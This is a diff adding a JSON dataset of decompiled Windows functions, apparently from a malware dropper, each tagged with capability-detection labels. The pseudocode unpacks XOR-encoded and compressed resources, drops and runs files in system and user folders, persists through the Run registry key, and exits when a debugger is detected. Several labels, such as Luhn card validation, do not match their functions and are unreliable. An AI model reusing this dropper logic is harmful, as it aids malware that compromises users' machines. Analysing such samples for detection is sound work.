@@ -1,0 +1,99 @@
+{
+    "00401000": {
+        "rules": [
+            "check OS version/c2d5920d27eb4726b54299bacf904e17",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\nuint __cdecl fcn.00401000(uint lpIconName)\n\n{\n    int32_t iVar1;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint lpMsg;\n    uint var_44h;\n    uint ARG_0;\n    uint var_2ch;\n    code *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    char *var_8h;\n    uint var_4h;\n    \n    // [00] -r-x section size 4096 named .text\n    ARG_0 = 0x30;\n    var_2ch = 0x2003;\n    var_28h = fcn.004010fb;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = lpIconName;\n    var_10h = 0x10;\n    var_ch = 0;\n    var_8h = \"WinClass32\";\n    var_18h = sub.user32.dll_LoadIconA(lpIconName, 500);\n    var_14h = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    var_4h = 0;\n    sub.user32.dll_RegisterClassExA(&ARG_0);\n    *0x40300f = sub.user32.dll_CreateWindowExA\n                          (0, \"WinClass32\", \"WinClass32\", 0xcf0000, 200, 200, 200, 200, 0, 0, lpIconName, 0);\n    sub.user32.dll_ShowWindow(*0x40300f, 1);\n    sub.user32.dll_UpdateWindow(*0x40300f);\n    while( true ) {\n        iVar1 = sub.user32.dll_GetMessageA(&lpMsg, 0, 0, 0);\n        if (iVar1 == 0) break;\n        sub.user32.dll_TranslateMessage(&lpMsg);\n        sub.user32.dll_DispatchMessageA();\n    }\n    return var_44h;\n}\n",
+        "token_count": 488
+    },
+    "0040119d": {
+        "rules": [
+            "check OS version/c2d5920d27eb4726b54299bacf904e17",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\nvoid fcn.0040119d(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    if (*(*(in_FS_OFFSET + 0x30) + 2) != '\\0') {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitProcess(0);\n    }\n    return;\n}\n",
+        "token_count": 70
+    },
+    "0040135a": {
+        "rules": [
+            "check OS version/c2d5920d27eb4726b54299bacf904e17",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: dwBytes\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: hObject\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid fcn.0040135a\n      noreturn \n               (void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint uVar9;\n    uint var_3ch;\n    uint hObject;\n    uint var_34h;\n    uint dwBytes;\n    uint var_2ch;\n    uint var_28h;\n    int32_t lpBuffer;\n    uint32_t nNumberOfBytesToWrite;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t dwFileAttributes;\n    int32_t var_4h;\n    \n    uVar9 = 0x1000;\n    sub.kernel32.dll_GetSystemDirectoryA(0x403c84, 0x1000);\n    (**0x4106d4)(0x403c84);\n    sub.kernel32.dll_GetWindowsDirectoryA(0x404c84, 0x1000);\n    (**0x4106d4)(0x404c84);\n    sub.kernel32.dll_GetTempPathA(0x1000, 0x405c84);\n    (**0x4106d4)(0x405c84);\n    sub.kernel32.dll_GetModuleFileNameA(0, 0x403a60, 0x200);\n    puVar2 = (**0x4106d0)(0x403a60);\n    *puVar2 = 0;\n    sub.kernel32.dll_GetEnvironmentVariableA(\"APPDATA\", 0x407c84, 0x1000);\n    (**0x4106d4)(0x407c84);\n    (**0x4106c8)(0, 0x408c84, 7, 1);\n    (**0x4106d4)(0x408c84);\n    uVar8 = 0;\n    (**0x4106c8)(0, 0x409c84, 0x10, 1);\n    (**0x4106d4)(0x409c84);\n    fcn.00401907();\n    if (*0x410684 == 1) {\n        fcn.004011c4();\n    }\n    fcn.00401abe();\n    iVar6 = 0;\n    piVar7 = *0x410688;\n    do {\n        iVar6 = sub.kernel32.dll_FindResourceA(0, iVar6 + 1, 10, iVar6 + 1);\n        if ((((iVar6 == 0) || (*0x403c74 = iVar6,  iVar6 = sub.kernel32.dll_SizeofResource(0, iVar6),  iVar6 == 0)) ||\n            (*0x403c78 = iVar6,  iVar6 = sub.kernel32.dll_LoadResource(0, *0x403c74),  iVar6 == 0)) ||\n           ((*0x403c7c = iVar6,  piVar3 = sub.kernel32.dll_LockResource(iVar6),  piVar3 == NULL ||\n            (*0x403c80 = piVar3,  iVar6 = sub.kernel32.dll_GlobalAlloc(0x40, *0x403c78),  iVar6 == 0)))) break;\n        iVar1 = **0x403c80;\n        nNumberOfBytesToWrite = (*0x403c80)[1];\n        *0x4106ac = iVar6;\n        sub.kernel32.dll_RtlMoveMemory(iVar6, *0x403c80 + 2, *0x403c78 + -8);\n        fcn.00401a90(*0x4106ac, *0x403c78);\n        iVar6 = sub.kernel32.dll_GlobalAlloc(0x40, nNumberOfBytesToWrite);\n        if (iVar6 == 0) break;\n        lpBuffer = iVar6;\n        if (iVar1 == 0) {\n            sub.kernel32.dll_RtlMoveMemory(iVar6, *0x4106ac, nNumberOfBytesToWrite);\n        }\n        else {\n            (**0x4106ec)(2, iVar6, nNumberOfBytesToWrite, *0x4106ac, *0x403c78 + -8, &fcn.0040135a::var_28h);\n        }\n        sub.kernel32.dll_GlobalFree(*0x4106ac);\n        iVar6 = 0x403660;\n        sub.kernel32.dll_lstrcpynA(0x403660, piVar7 + 1, *piVar7, *piVar7);\n        piVar7 = piVar7 + 1 + iVar6;\n        var_4h = *piVar7;\n        dwFileAttributes = piVar7[1];\n        var_ch = piVar7[2];\n        var_10h = piVar7[3];\n        var_14h = piVar7[4];\n        var_18h = piVar7[5];\n        piVar7 = piVar7 + 6;\n        if (var_18h != 0) {\n            sub.kernel32.dll_lstrcpyA(0x40334d, piVar7);\n            iVar6 = sub.kernel32.dll_lstrlenA(piVar7);\n            piVar7 = piVar7 + iVar6 + 1;\n        }\n        var_1ch = *piVar7;\n        piVar7 = piVar7 + 1;\n        if (var_1ch != 0) {\n            sub.kernel32.dll_lstrcpyA(0x40324d, piVar7);\n            iVar6 = sub.kernel32.dll_lstrlenA(piVar7);\n            piVar7 = piVar7 + iVar6 + 1;\n        }\n        if (var_4h == 0) {\n            *0x4106b4 = 0x403c84;\n        }\n        else if (var_4h == 1) {\n            *0x4106b4 = 0x404c84;\n        }\n        else if (var_4h == 2) {\n            *0x4106b4 = 0x405c84;\n        }\n        else if (var_4h == 3) {\n            *0x4106b4 = 0x403a60;\n        }\n        else if (var_4h == 4) {\n            *0x4106b4 = 0x407c84;\n        }\n        else if (var_4h == 5) {\n            *0x4106b4 = 0x408c84;\n        }\n        else if (var_4h == 6) {\n            *0x4106b4 = 0x409c84;\n        }\n        else {\n            *0x4106b4 = var_4h;\n            if (var_4h == -1) {\n                *0x4106b4 = 0x40334d;\n            }\n        }\n        sub.kernel32.dll_lstrcpyA(0x406c84, *0x4106b4);\n        (**0x4106d4)(0x406c84);\n        dwFileAttributes = 0x403660;\n        var_14h = 0x406c84;\n        var_10h = 0x40166e;\n        sub.kernel32.dll_lstrcatA();\n        if ((*0x41069c == 2) && (var_14h == *0x4106a8)) {\n            var_10h = 0x406c84;\n            var_14h = 0x40ac84;\n            var_18h = 0x401692;\n            sub.kernel32.dll_lstrcpyA();\n        }\n        var_18h = 0;\n        var_1ch = 0x80;\n        nNumberOfBytesToWrite = 2;\n        lpBuffer = 0;\n        var_28h = 3;\n        *0x4106b8 = sub.kernel32.dll_CreateFileA(0x406c84, 0xc0000000);\n        iVar6 = *0x4106b8;\n        sub.kernel32.dll_WriteFile(uVar9, lpBuffer, nNumberOfBytesToWrite, 0x4106bc, 0);\n        if ((*0x41069c == 2) && (iVar6 == *0x4106a8)) {\n            if (*0x4106a0 == 1) {\n                if (nNumberOfBytesToWrite < *0x4106a4) {\n                    iVar6 = *0x4106a4 - nNumberOfBytesToWrite;\n                    uVar4 = sub.kernel32.dll_HeapAlloc(*0x403c70, 8, iVar6);\n                    sub.kernel32.dll_WriteFile(*0x4106b8, uVar4, iVar6, 0x4106bc, 0);\n                    iVar6 = *0x403c70;\n                    sub.kernel32.dll_HeapFree();\n                }\n            }\n            else if (*0x4106a0 == 0) {\n                iVar6 = sub.kernel32.dll_CreateFileA(0x40bc84, 0x80000000, 1, 0, 3, 0x80, 0);\n                uVar5 = sub.kernel32.dll_GetFileSize(iVar6, 0);\n                sub.kernel32.dll_CloseHandle();\n                if (nNumberOfBytesToWrite < uVar5) {\n                    iVar6 = uVar5 - nNumberOfBytesToWrite;\n                    uVar4 = sub.kernel32.dll_HeapAlloc(*0x403c70, 8, iVar6);\n                    sub.kernel32.dll_WriteFile(*0x4106b8, uVar4, iVar6, 0x4106bc, 0);\n                    iVar6 = *0x403c70;\n                    sub.kernel32.dll_HeapFree(*0x403c70, 0, uVar4);\n                }\n            }\n        }\n        sub.kernel32.dll_CloseHandle(*0x4106b8, iVar6);\n        sub.kernel32.dll_GlobalFree(lpBuffer);\n        sub.kernel32.dll_SetFileAttributesA(uVar8, dwFileAttributes);\n        if (var_14h == 1) {\n            fcn.004012f7(0x406c84);\n        }\n        if (var_10h != 0) {\n            if (var_ch == 1) {\n                uVar4 = 5;\n            }\n            else if (var_ch == 2) {\n                uVar4 = 0;\n            }\n            else if (var_ch == 3) {\n                uVar4 = 3;\n            }\n            else {\n                uVar4 = 6;\n            }\n            sub.kernel32.dll_lstrcpyA(0x403860, 0x406c84, uVar4);\n            puVar2 = sub.shlwapi.dll_PathFindFileNameA(0x403860);\n            *puVar2 = 0;\n            if (var_1ch == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = 0x40324d;\n            }\n            (**0x4106c4)(0, \"open\", 0x406c84, uVar4, 0x403860);\n        }\n        iVar6 = *0x403c7c;\n        sub.kernel32.dll_FreeResource();\n    } while (iVar6 < *0x4106b0);\n    if (*0x41069c == 1) {\n        fcn.00401157();\n    }\n    else if (*0x41069c == 2) {\n        fcn.004018a3();\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitProcess(0);\n}\n",
+        "token_count": 2655
+    },
+    "004010fb": {
+        "rules": [
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\nuint __cdecl fcn.004010fb(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    if (arg_ch == 0x9d99) {\n    // WARNING: Subroutine does not return\n        fcn.0040135a();\n    }\n    if (arg_ch == 1) {\n        fcn.004011cf();\n        sub.user32.dll_SendMessageA(arg_8h, 0x9d99, 0, 0);\n    }\n    else if (arg_ch == 2) {\n        sub.user32.dll_PostQuitMessage(0);\n        return 0;\n    }\n    uVar1 = sub.user32.dll_DefWindowProcA(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar1;\n}\n",
+        "token_count": 190
+    },
+    "00401907": {
+        "rules": [
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\nvoid fcn.00401907(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    uint var_8h;\n    uint dwBytes;\n    \n    iVar3 = sub.kernel32.dll_FindResourceA(0, 0x1001, 10);\n    if ((((iVar3 != 0) && (*0x403c74 = iVar3,  iVar3 = sub.kernel32.dll_SizeofResource(0, iVar3),  iVar3 != 0)) &&\n        (*0x403c78 = iVar3,  iVar3 = sub.kernel32.dll_LoadResource(0, *0x403c74),  iVar3 != 0)) &&\n       (*0x403c7c = iVar3,  iVar3 = sub.kernel32.dll_LockResource(iVar3),  iVar3 != 0)) {\n        *0x403c80 = iVar3;\n        sub.kernel32.dll_RtlMoveMemory(0x403450, iVar3, 0x10);\n        fcn.00401a90(iVar3 + 0x10, *0x403c78 + -0x10);\n        *0x410684 = *(iVar3 + 0x10);\n        iVar1 = *(iVar3 + 0x14);\n        piVar4 = iVar3 + 0x18;\n        if (iVar1 != 0) {\n            *0x410690 = sub.kernel32.dll_HeapAlloc(*0x403c70, 8, iVar1);\n            sub.kernel32.dll_RtlMoveMemory(*0x410690, piVar4, iVar1);\n            iVar2 = *(piVar4 + iVar1);\n            piVar4 = piVar4 + iVar1 + 1;\n            *0x410694 = sub.kernel32.dll_HeapAlloc(*0x403c70, 8, iVar2);\n            sub.kernel32.dll_RtlMoveMemory(*0x410694, piVar4, iVar2);\n            puVar5 = piVar4 + iVar2;\n            *0x410698 = *puVar5;\n            piVar4 = puVar5 + 1;\n        }\n        *0x41069c = *piVar4;\n        piVar6 = piVar4 + 1;\n        if (*0x41069c == 2) {\n            *0x4106a8 = *piVar6;\n            *0x4106a0 = piVar4[2];\n            piVar6 = piVar4 + 3;\n            if (*0x4106a0 == 1) {\n                *0x4106a4 = *piVar6;\n                piVar6 = piVar4 + 4;\n            }\n        }\n        *0x4106b0 = *piVar6;\n        *0x41068c = *0x403c78 - ((piVar6 + 1) - iVar3);\n        *0x410688 = sub.kernel32.dll_GlobalAlloc(0x40, *0x41068c);\n        sub.kernel32.dll_RtlMoveMemory(*0x410688, piVar6 + 1, *0x41068c);\n        sub.kernel32.dll_FreeResource(*0x403c7c);\n        return;\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitProcess(0);\n}\n",
+        "token_count": 750
+    },
+    "004012d9": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
+            "encode data using XOR"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.004012d9(char *arg_8h, int32_t arg_ch)\n\n{\n    ulong uVar1;\n    \n    do {\n        uVar1 = rdtsc();\n        *arg_8h = ((uVar1 ^ arg_ch) & 0xf) + 0x41;\n        arg_ch = arg_ch + -1;\n        arg_8h = arg_8h + 1;\n    } while (arg_ch != 0);\n    return;\n}\n",
+        "token_count": 108
+    },
+    "004012f7": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
+            "persist via Run registry key"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.004012f7(uint lpString)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    (**0x4106dc)(0x80000002, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, 0, 0, 0xf003f, 0, &var_4h, 0);\n    fcn.004012d9(0x403c60, 0xf);\n    iVar1 = sub.kernel32.dll_lstrlenA(lpString);\n    (**0x4106e0)(var_4h, 0x403c60, 0, 1, lpString, iVar1 + 1);\n    (**0x4106e4)(var_4h);\n    return;\n}\n",
+        "token_count": 171
+    },
+    "004011af": {
+        "rules": [
+            "PEB access",
+            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d",
+            "check for PEB NtGlobalFlag flag"
+        ],
+        "decompiled_code": "\nvoid fcn.004011af(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    if ((*(*(in_FS_OFFSET + 0x30) + 0x68) & 0x70) != 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitProcess(0);\n    }\n    return;\n}\n",
+        "token_count": 77
+    },
+    "00401a90": {
+        "rules": [
+            "contain loop"
+        ],
+        "decompiled_code": "\nuint64_t __cdecl fcn.00401a90(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t in_EAX;\n    uint in_EDX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    \n    iVar1 = 0;\n    puVar2 = arg_8h;\n    if (arg_ch == 0) {\n        return in_EAX;\n    }\n    do {\n        if (iVar1 == 0x10) {\n            iVar1 = 0;\n        }\n        *puVar2 = *arg_8h ^ *(iVar1 + 0x403450);\n        iVar1 = iVar1 + 1;\n        arg_ch = arg_ch + -1;\n        arg_8h = arg_8h + 1;\n        puVar2 = puVar2 + 1;\n    } while (arg_ch != 0);\n    return CONCAT44(in_EDX, in_EAX);\n}\n",
+        "token_count": 210
+    },
+    "004011cf": {
+        "rules": [
+            "query environment variable",
+            "compress data via WinAPI",
+            "link function at runtime on Windows",
+            "link many functions at runtime"
+        ],
+        "decompiled_code": "\nvoid fcn.004011cf(void)\n\n{\n    *0x4106c0 = sub.kernel32.dll_LoadLibraryA(\"Shell32.dll\");\n    *0x4106c4 = sub.kernel32.dll_GetProcAddress(*0x4106c0, \"ShellExecuteA\");\n    *0x4106c8 = sub.kernel32.dll_GetProcAddress(*0x4106c0, \"SHGetSpecialFolderPathA\");\n    *0x4106cc = sub.kernel32.dll_LoadLibraryA(\"shlwapi.dll\");\n    *0x4106d0 = sub.kernel32.dll_GetProcAddress(*0x4106cc, \"PathFindFileNameA\");\n    *0x4106d4 = sub.kernel32.dll_GetProcAddress(*0x4106cc, \"PathAddBackslashA\");\n    *0x4106d8 = sub.kernel32.dll_LoadLibraryA(\"advapi32.dll\");\n    *0x4106dc = sub.kernel32.dll_GetProcAddress(*0x4106d8, \"RegCreateKeyExA\");\n    *0x4106e0 = sub.kernel32.dll_GetProcAddress(*0x4106d8, \"RegSetValueExA\");\n    *0x4106e4 = sub.kernel32.dll_GetProcAddress(*0x4106d8, \"RegCloseKey\");\n    *0x4106e8 = sub.kernel32.dll_LoadLibraryA(\"ntdll.dll\");\n    *0x4106ec = sub.kernel32.dll_GetProcAddress(*0x4106e8, \"RtlDecompressBuffer\");\n    sub.kernel32.dll_GetModuleFileNameA(0, 0x40bc84, 0x1000);\n    sub.kernel32.dll_GetEnvironmentVariableA(\"ComSpec\", 0x40fc84, 0x500);\n    return;\n}\n",
+        "token_count": 381
+    },
+    "null": {
+        "rules": [
+            "accept command line arguments"
+        ],
+        "decompiled_code": "\nvoid entry0 noreturn (void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    *0x40300b = sub.kernel32.dll_GetCommandLineA();\n    *0x403013 = sub.kernel32.dll_GetModuleHandleA(0);\n    *0x403c70 = sub.kernel32.dll_GetProcessHeap();\n    uVar4 = 10;\n    uVar2 = 0;\n    uVar1 = *0x403013;\n    uVar3 = *0x40300b;\n    fcn.00401000(*0x403013);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitProcess(0, uVar1, uVar2, uVar3, uVar4);\n}\n",
+        "token_count": 176
+    }
+}
